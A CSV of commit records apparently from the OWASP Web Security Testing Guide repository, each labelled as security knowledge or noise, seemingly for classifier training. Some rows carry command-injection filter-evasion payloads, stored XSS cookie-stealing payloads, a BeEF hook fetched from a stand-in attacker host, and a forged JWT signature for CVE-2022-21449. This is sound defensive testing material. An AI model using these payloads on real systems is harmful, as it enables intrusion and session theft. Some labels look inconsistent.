hash,message,added_lines,label,notes
0b78e0a5dd39e3bf3822adb0cb1c796a293fe717,Update 12-Testing_for_Command_Injection.md (#1243),"+OS command injection is a vulnerability that occurs when user input is directly passed to an operating system command without proper validation or sanitization. This allows the user to inject and execute arbitrary commands on the server which can lead to unauthorized data access, data corruption, and full server compromise. This vulnerability can be prevented by emphasizing security during the design and development of applications.
+- Identify and assess command injection points.
+- Bypass special characters and OS commands filter.
+Consider the case of an application that contains a set of documents that you can browse from the internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (`https://www.example.com/public/doc`):
+Special characters are used to chain multiple commands together.
+These characters will vary based on the operating system running on the web server.
+For instance, the following types of command chaining can be used on both Windows and Unix-based systems :
+- `cmd1|cmd2` : cmd2 will be executed whether cmd1 succeeds or not.
+- `cmd1||cmd2` : cmd2 will only be executed if cmd1 fails.
+- `cmd1&&cmd2` : cmd2 will only be executed if cmd1 succeeds.
+- `cmd1&cmd2` : cmd2 will be executed whether cmd1 succeeds or not.  
+
+Note that, `;` will work on Unix-based systems and PowerShell. However, it will not work on Windows Command Prompt (CMD).  
+Furthermore, you can use Bash command substitution `$(cmd)` or &grave;`cmd`&grave; to execute commands on Unix-based systems.  
+Additionally, Linux file descriptors such as `>(cmd)`, `<(cmd)` can also be used.
+
+## Filter Evasion
+
+To prevent OS command injection, web developers often use filters. However, these filters are sometimes not properly implemented which allows attackers to bypass them.
+In this section, we will cover different techniques used to bypass those filters.
+
+### Methodology
+
+First of all, it is always good practice to have a basic understanding of how the filter works before trying to bypass it.
+Here is a methodology we can use when we come across a filter:
+
+- Is the filter client-side or server-side ?
+- Is the filter applied on special characters, OS commands, or both ?
+- Is the webapp using a allowlist or blocklist filter ?
+- What OS is running on the web server? This allows us to have an idea of the commands and special characters we can use.
+
+### Special Characters Filter Evasion
+
+As previously mentionned, filters can either be applied on special characters, OS commands or both.
+To bypass filters applied on special characters, we can use environment variables, Bash brace expansion or URL encoding.
+
+#### URL Encoding
+
+URL encoding special characters can allow us to bypass the filter if the web server only blocks the plaintext special characters.
+Here are some special characters with their URL encoded format:
+
+|Special Character|URL Encoding|
+|-----------------|------------|
+|;                | %3b        |
+|space            | %20        |
+|tab              | %09        |
+|&                | %26        |
+|New line         | %0a        |
+
+For instance, instead of using `;whoami`, we could use `%3bwhoami`.
+
+#### Environment Variables
+
+Special characters like space, semi-colon, tab, or new line will generally be filtered by the web server especially if they are not useful for the specified input.  
+To escape this restriction, we can use environment variables such as **IFS**, **PATH** or **LS_COLORS** on Linux, and **HOMEPATH** on Windows.  
+For instance, on Linux, `/`, `;`, and `[space]` can be replaced respectively with `${PATH:0:1}`, `${LS_COLORS:10:1}`, and `${IFS}`.  
+On Windows CMD, we can replace `\` with `%HOMEPATH:~6,1%`, or use `$env:HOMEPATH[0]` in PowerShell.
+
+#### Bash Brace Expansion
+
+Bash brace expansion is a Bash feature that allows you to execute commands by using curly braces.  
+For example, `{ls,-la}` will execute `ls -la` command. This can be extremely useful if the web server is filtering space, new line, or tab characters.  
+Let's assume that we want to display the content of '/etc/passwd' file. Thus, instead of using `;cat /etc/passwd`, we can use `;{cat,/etc/passwd}`.
+That said, it's important to note that this technique will only work if the web server is using Bash and if characters like `}{/,;` are not filtered.
+
+### Commands Filter Evasion
+
+In this section, we are going to explore some techniques used to bypass filters applied on operating system commands.
+
+#### Case Modification
+
+Case modification is a technique that is used to bypass OS command filters. This will be helpful if the server-side filter is case sensitive.  
+For instance, if we notice during our testing that the web server is blocking `;whoami`, we can try to use instead `;WhoAmi`, and see that the server-side filter is only blocking lowercase commands, we will be able to bypass it.  
+Note that this technique will generally",1,Security Knowledge
a0fd25083c75c6c95cac80f1aa2d234c68a240cd,Publish Latest JSON checklist 2021-05-25 (#749),"+                ,{
+                ""name"":""Testing JSON Web Tokens"",
+                ""id"":""WSTG-SESS-10"",
+                ""reference"":""https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.html"",
+                ""objectives"":[
+                    ""Determine whether the JWTs expose sensitive information."",
+                    ""Determine whether the JWTs can be tampered with or modified.""
+                  ]
+                }",0,Noise / Non-knowledge
7c8055264b1deacb086a231d60251e50a2d83fbe,Update 05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md (#1071),"+Administrator interfaces may be present in the application or on the application server to allow certain users to perform privileged activities on the site. Tests should be undertaken to reveal if and how this privileged functionality can be accessed by an unauthorized or standard user.
+### Black Box Testing
+The following section describes vectors that may be used to test for the presence of administrative interfaces. These techniques may also be used to test for related issues including privilege escalation, and are described elsewhere in this guide (for example, [Testing for bypassing authorization schema](../05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md) and [Testing for Insecure Direct Object References](../05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md)) in greater detail.
+- Directory and file enumeration: An administrative interface may be present but not visibly available to the tester. The path of the administrative interface may be guessed by simple requests such as /admin or /administrator. In some scenarios, these paths can be revealed within seconds using advanced Google search techniques - [Google dorks](https://www.exploit-db.com/google-hacking-database). There are many tools available to perform brute forcing of server contents, see the tools section below for more information. A tester may have to also identify the filename of the administration page. Forcibly browsing to the identified page may provide access to the interface.
+- Comments and links in source code: Many sites use common code that is loaded for all site users. By examining all source sent to the client, links to administrator functionality may be discovered and should be investigated.
+- Reviewing server and application documentation: If the application server or application is deployed in its default configuration it may be possible to access the administration interface using information described in configuration or help documentation. Default password lists should be consulted if an administrative interface is found and credentials are required.
+- Publicly available information: Many applications, such as WordPress, have administrative interfaces that are available by default.
+- Alternative server port: Administration interfaces may be seen on a different port on the host than the main application. For example, Apache Tomcat's Administration interface can often be seen on port 8080.
+- Parameter tampering: A GET or POST parameter, or a cookie may be required to enable the administrator functionality. Clues to this include the presence of hidden fields such as:
+Once an administrative interface has been discovered, a combination of the above techniques may be used to attempt to bypass authentication. If this fails, the tester may wish to attempt a brute force attack. In such an instance, the tester should be aware of the potential for administrative account lockout if such functionality is present.
+### Gray Box Testing
+Source code should be reviewed to ensure that the authorization and authentication model ensures clear separation of duties between normal users and site administrators. User interface functions shared between normal and administrator users should be reviewed to ensure clear separation between the rendering of such components and the information leakage from such shared functionality.
+Each web framework may have its own default admin pages or paths, as in the following examples:
+Several tools can assist in identifying hidden administrator interfaces and functionality, including:
+
+- A brute forcer is much more effective when it uses a good dictionary, such as the [Netsparker](https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/) dictionary.",1,Security Knowledge
cdd787374d25487e96bdf0e029d79863ba1c6cb1,Fix Multiple Spelling Errors (#918),"+- list of bindable fields via `setAllowedFields` method of the `DataBinder` class (e.g. `binder.setAllowedFields([""username"",""password"",""email""])`)
+- list of non-bindable fields via `setDisallowedFields` method of the `DataBinder` class (e.g. `binder.setDisallowedFields([""isAdmin""])`)
+- list of bindable fields via `Bind` attribute (e.g. `[Bind(Include = ""FirstName, LastName"")] Student std`), via `includeProperties` (e.g. `includeProperties: new[] { ""FirstName, LastName"" }`) or through `TryUpdateModel`
+- list of non-bindable fields via `Bind` attribute (e.g. `[Bind(Exclude = ""Status"")] Student std`) or via `excludeProperties` (e.g. `excludeProperties: new[] { ""Status"" }`)",0,Noise / Non-knowledge
686608acbb13f4f600120e2e9b6a0b753841ff16,chore: update Slack invite link,+- Join [OWASP Slack](https://join.slack.com/t/owasp/shared_invite/enQtNjExMTc3MTg0MzU4LWQ2Nzg3NGJiZGQ2MjRmNzkzN2Q4YzU1MWYyZTdjYjA2ZTA5M2RkNzE2ZjdkNzI5ZThhOWY5MjljYWZmYmY4ZjM).,0,Noise / Non-knowledge
63fbe5bfb3b93ba4f3edfb0bd02e75429a3be5ce,Bump actions/setup-node from 5 to 6 in the dependencies group (#1247),"+      uses: actions/setup-node@v6
+      uses: actions/setup-node@v6
+      uses: actions/setup-node@v6
+      uses: actions/setup-node@v6
+      uses: actions/setup-node@v6",0,Noise / Non-knowledge
2e97929f6f1507eb6b3f6e45deabf22d53026b9d,4.8.2 - v4 Migration Cleanup,"+# Testing for Stored Cross Site Scripting
+## Summary
+
+Stored [Cross-site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.
+- Hijacking another user's browser
+- Capturing sensitive information viewed by application users
+- Pseudo defacement of the application
+- Port scanning of internal hosts (“internal” in relation to the users of the web application)
+- Directed delivery of browser-based exploits
+- Other malicious activities
+- Attacker stores malicious code into the vulnerable page
+- User authenticates in the application
+- User visits vulnerable page
+- Malicious code is executed by the user's browser
+This type of attack can also be exploited with browser exploitation frameworks such as [BeEF](http://www.beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.
+## How to Test
+### Black Box Testing
+The process for identifying stored XSS vulnerabilities is similar to the process described during the [testing for reflected XSS](4.8.1_Testing_for_Reflected_Cross_Site_Scripting_OTG-INPVAL-001.md).
+#### Input Forms
+- User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.
+- Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later
+- File Manager: application that allows upload of files
+- Application settings/preferences: application that allows the user to set preferences
+- Forum/Message board: application that permits exchange of posts among users
+- Blog: if the blog application permits to users submitting comments
+- Log: if the application stores some users input into logs.
+#### Analyze HTML Code
+**Note**: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.
+**Example**: Email stored data in index2.php
+![Stored Input Example](images/Stored_input_example.jpg)\
+*Figure 4.8.2-1:Stored Input Example*
+```html
+<input class=""inputbox"" type=""text"" name=""email"" size=""40"" value=""aaa@aa.com"" />
+```
+In this case, the tester needs to find a way to inject code outside the `<input>` tag as below:
+```html
+<input class=""inputbox"" type=""text"" name=""email"" size=""40"" value=""aaa@aa.com""> MALICIOUS CODE <!-- />
+```
+#### Testing for Stored XSS
+- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
+- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`
+Ensure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy such as [WebScarab](https://www.owasp.org/index.php/OWASP_WebScarab_Project). It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.
+> ![Stored XSS Exxample](images/Stored_xss_example.jpg)\
+> *Figure 4.8.2-2:Stored Input Example*
+>
+> The HTML code following the injection:
+>
+> ```html
+> <input class=""inputbox"" type=""text"" name=""email"" size=""40"" value=""aaa@aa.com""><script>alert(document.cookie)</script>
+> ```
+>
+> The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string “SCRIPT” is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see [testing for reflected XSS](4.8.1_Testing_for_Reflected_Cross_Site_Scripting_OTG-INPVAL-001.md)) chapter). It is strongly recommended that testers refer to [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) and [Mario](https://cybersecurity.wtf/encoder/) XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.
+#### Leverage Stored XSS with BeEF
+Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](http://www.beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/).
+- Injecting a JavaScript hook which communicates to the attacker's browser exploitation framework (BeEF)
+- Waiting for the application user to view the vulnerable page where the stored input is displayed
+- Control the application user’s browser via the BeEF console
+**Example**: BeEF Injection in index2.php:
+`aaa@aa.com”><script src=http://attackersite/hook.js></script>`
",0,Noise / Non-knowledge
b4a75edea805939bdd495a937278d0081fe6d736,Update Author Section (#928),+- Jinson Varghese Behanan,0,Noise / Non-knowledge
54b605da76b00756849fe15fea8099945f4761b8,Add CVE-2022-211449 (Java ECDSA validation failure) (#930),"+#### ECDSA ""Psychic Signatures""
+
+A vulnerability was identified in Java version 15 to 18 where they did not correctly validate ECDSA signatures in some circumstances ([CVE-2022-21449](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/), known as ""psychic signatures""). If one of these vulnerable version is used parse a JWT using the `ES256` algorithm, this can be used to completely bypass the signature verification by tampering the body and then replacing the signature with the following value:
+
+```txt
+MAYCAQACAQA
+```
+
+Resulting in a JWT which looks something like this:
+
+```txt
+eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.MAYCAQACAQA
+```
+",1,Security Knowledge
a13469e32d35a2d71edf2eeca2b6304935684b12,Have link check use GET (#1283),"+    ""useHead"": false,
+        { ""pattern"": ""^/"" },
+        { ""pattern"": ""^https://www\\.nstalker\\.com"" },
+        { ""pattern"": ""^https://www.kali.org"" },
+        { ""pattern"": ""^https://.*\\.linkedin\\.com"" },
+        { ""pattern"": ""^https://www\\.shodan\\.io"" },
+        { ""pattern"": ""^https://developer\\.android\\.com"" },
+        { ""pattern"": ""^https://github\\.com"" }
+    ],
+    ""httpHeaders"": [
+            ""urls"": [""https://"", ""http://""],
+            ""headers"": {
+                ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0""
+            }
+    ""aliveStatusCodes"": [200, 202]
+}
+        cat artifact.txt >> $GITHUB_STEP_SUMMARY",0,Noise / Non-knowledge
f994e54c1567feb1e22d4fe6e3eb3fa371855f6c,Add author credit for CSTI section (#1303),+- Meysam Bal-afkan,0,Noise / Non-knowledge
35db96718a510815a96dd1e995bc1c51b95ae5bc,Merge pull request #50 from kingthorin/readme-badge,,0,Noise / Non-knowledge
5a7a972617fefddbb4a3f144b7edbe2ac87b1319,Add length and common passwords to the password policy guidance (#191),"+The most prevalent and most easily administered authentication mechanism is a static password. The password represents the keys to the kingdom, but is often subverted by users in the name of usability. In each of the recent high profile hacks that have revealed user credentials, it is lamented that most common passwords are still: `123456`, `password` and `qwerty`.
+3. When must a user change their password?
+    * Both [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecretver) and [NCSC](https://www.ncsc.gov.uk/collection/passwords/updating-your-approach#PasswordGuidance:UpdatingYourApproach-Don'tenforceregularpasswordexpiry) recommend **against** forcing regular password expiry, although it may be required by standards such as PCI DSS.
+7. What are the minimum and maximum password lengths that can be set, and are they appropriate for the sensitivity of the account and application?
+8. Is it possible set common passwords such as `Password1` or `123456`?
+To mitigate the risk of easily guessed passwords facilitating unauthorized access there are two solutions: introduce additional authentication controls (i.e. two-factor authentication) or introduce a strong password policy. The simplest and cheapest of these is the introduction of a strong password policy that ensures password length, complexity, reuse and aging; although ideally both of them should be implemented.",1,Security Knowledge
18c3f72ea40031731ee5097bbb02e23dc751fa2e,Make white/gray/black-box consistent (close #139) (#236),"+### Black-Box Testing
+### Gray-Box Testing
+Applications should be developed with mechanisms to only accept and manipulate “acceptable“ files that the rest of the application functionality is ready to handle and expecting. Some specific examples include: blacklisting or whitelisting of file extensions, using “Content-Type” from the header, or using a file type recognizer, all to only allow specified file types into the system.
+# Test Upload of Malicious Files
+While safeguards such as blacklisting or whitelisting of file extensions, using “Content-Type” from the header, or using a file type recognizer may not always be protections against this type of vulnerability. Every application that accepts files from users must have a mechanism to verify that the uploaded file does not contain malicious code. Uploaded files should never be stored where the users or attackers can directly access them.
+### Black-Box Testing
+### Gray-Box Testing
+Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. The only difference here is that you may have API documentation for the application being tested which includes the expected WebSocket request and responses.
+### Black-Box Testing
+### Gray-Box Testing
+Not applicable. The methodology remains the same as listed in black-box testing no matter how much information the tester starts with.
+### Black-Box Testing
+### Gray-Box Testing
+### Black-Box Testing
+### Gray-Box Testing
+Testing for application entry points via a gray-box methodology would consist of everything already identified above with one addition. In cases where there are external sources from which the application receives data and processes it (such as SNMP traps, syslog messages, SMTP, or SOAP messages from other servers) a meeting with the application developers could identify any functions that would accept or expect user input and how they are formatted. For example, the developer could help in understanding how to formulate a correct SOAP request that the application would accept and where the web service resides (if the web service or any other function hasn't already been identified during the black-box testing).
+In black-box testing it is extremely difficult to test the entire code base. Not just because the tester has no view of the code paths through the application, but even if they did, to test all code paths would be very time consuming. One way to reconcile this is to document what code paths were discovered and tested.
+### Black-Box Testing
+### Gray-Box or White-Box Testing
+Ensuring sufficient code coverage for the application owner is far easier with gray-box and white-box approach to testing. Information solicited by and provided to the tester will ensure the minimum requirements for code coverage are met.
+### Black-Box Testing
+### Black-Box Testing
+### Gray-Box Testing
+### Black-Box Testing
+### Gray-Box Testing
+### Gray-Box Testing
+Performing white-box testing against file extensions handling amounts to checking the configurations of web servers or application servers taking part in the web application architecture, and verifying how they are instructed to serve different file extensions.
+### Black-Box Testing
+### Gray-Box Testing
+### Black-Box Testing
+### Gray-Box Testing
+In black-box testing, the tester knows nothing about the specific application, username, application logic, error messages on log in page, or password recovery facilities. If the application is vulnerable, the tester receives a response message that reveals, directly or indirectly, some information useful for enumerating users.
+### Gray-Box Testing
+Verify that the application answers in the same manner for every client request that produces a failed authentication. For this issue the black-box testing and gray-box testing have the same concept based on the analysis of messages or error codes received from web application.
+### Black-Box Testing
+### Gray-Box Testing
+In black-box testing the tester knows nothing about the application and its underlying infrastructure. In reality this is often not true, and some information about the application is known. We suppose that you have identified, through the use of the techniques described in this Testing Guide under the chapter [Information Gathering](../4.2_Information_Gathering/4.2_Testing_Information_Gathering.md), at least one or more common applications that may contain accessible administrative interfaces.
+#### Gray-Box Testing
+The following steps rely on an entirely gray-box approach. If only some of this information is available to you, refer to black-box testing to fill the gaps.
+- Examine the user database for default credentials as described in the black-box testing section. Also check for empty password fields.
+### Black-Box Testing
+### Gray-Box Testing
+### Gray-Box Testing
+The methodology for testing is equivalent to the black-box case, as in both scenarios testers",0,Noise / Non-knowledge
c45cf08125aff40ec34d1375c7dca6b7f32e4d09,Delete 4. OWASP Summit Session: Methodology review and update test,,0,Noise / Non-knowledge
bcf7b4b9c03f05419ec31851a9aa4b2b16d387c1,Add OWASP guides,"+## Summary
+
+- [OWASP](#owasp)
+  - [Web Security Testing Guide (WSTG)](#web-security-testing-guide-wstg)
+  - [Mobile Security Testing Guide (WSTG)](#mobile-security-testing-guide-wstg)
+## OWASP
+
+This present document (WSTG) describes the OWASP-recommended methodology for web application security testing. For recommendations specific to mobile devices, the Mobile Security Testing Guide (MSTG) is also available.
+",0,Noise / Non-knowledge
a23877f75dfbe2383a0444f67f8eee420319dcfc,Update scenario with no domain attribute (#1001),"+For example, if a cookie is set by an application at `app.mydomain.com` with no domain attribute set, then the cookie would be resubmitted for all subsequent requests for `app.mydomain.com`, but not its subdomains (such as `hacker.app.mydomain.com`), or to `otherapp.mydomain.com`. (However, older versions of Edge/IE behave differently, and _do_ send these cookies to subdomains.) If a developer wanted to loosen this restriction, then they could set the `domain` attribute to `mydomain.com`. In this case the cookie would be sent to all requests for `app.mydomain.com` and `mydomain.com` subdomains, such as `hacker.app.mydomain.com`, and even `bank.mydomain.com`. If there was a vulnerable server on a subdomain (for example, `otherapp.mydomain.com`) and the `domain` attribute has been set too loosely (for example, `mydomain.com`), then the vulnerable server could be used to harvest cookies (such as session tokens) across the full scope of `mydomain.com`.
+- [Internet Explorer Cookie Internals (FAQ)](https://learn.microsoft.com/en-gb/archive/blogs/ieinternals/internet-explorer-cookie-internals-faq)",1,Security Knowledge
29a5c889ce6be79f3c11eaa88ded28b711fa1832,fix more formatting issues,"+```       
+```
+$ dig CNAME fictioussubdomain.victim.com
+; <<>> DiG 9.10.3-P4-Ubuntu <<>> ns victim.com
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 42950
+;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
+```
+```
+$ whois 192.30.252.153 | grep ""OrgName""
+OrgName: GitHub, Inc.
+```
+```
+$ dig ns victim.com +short
+ns1.victim.com
+nameserver.expireddomain.com
+```",0,Noise / Non-knowledge
9e04ced0b3d5cf0d77faf69e7101d2473b95b12b,add link to API Reconnaissance (#1155),"+4.12.1 [API Reconnaissance](01-API_Reconnaissance.md)
+
+4.12.99 [Testing GraphQL](99-Testing_GraphQL.md)
+#### 4.12.1 [API Reconnaissance](4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance.md)
+
+#### 4.12.99 [Testing GraphQL](4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md)",0,Noise / Non-knowledge
3c9619c7e8dc8efb1dedd6928ab00bd6ca345709,Update document/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies.md,,0,Noise / Non-knowledge
0296b5910a69f47b8e9847b96687ff7becd5e832,Merge pull request #343 from Zeerg/patch-1,,0,Noise / Non-knowledge
e9136e7913cd7ff14a348145401c4c0c5392c6c9,Publish Latest JSON checklist 2021-11-07 (#808),"+                ,{
+                ""name"":""Testing for Mass Assignment"",
+                ""id"":""WSTG-INPV-20"",
+                ""reference"":""https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.html"",
+                ""objectives"":[
+                    ""Identify requests that modify objects"",
+                    ""Assess if it is possible to modify fields never intended to be modified from outside""
+                  ]
+                }",0,Noise / Non-knowledge
e21a628c66fe77c736dd659b62dbfb67df97e6db,Publish Latest checklists 2022-09-01 (#970),+SHA-256: 21a5481cf65ae70f79565e931cd021f8dc75b84ab1527849ceba2fffcf07585d,0,Noise / Non-knowledge
